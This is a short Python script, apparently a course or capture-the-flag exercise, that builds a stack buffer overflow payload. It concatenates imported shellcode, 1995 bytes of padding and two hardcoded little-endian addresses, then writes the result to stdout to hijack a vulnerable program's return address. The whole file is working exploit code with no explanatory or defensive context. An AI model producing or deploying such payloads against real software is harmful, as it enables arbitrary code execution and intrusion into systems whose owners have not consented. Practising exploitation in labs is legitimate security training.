import sys
from shellcode import shellcode

addr = 0xfff6b178.to_bytes(4, "little")
ret_addr= 0xbffefa9c.to_bytes(4,"little")
sys.stdout.buffer.write(shellcode + b"A" * 1995 + addr+ ret_addr)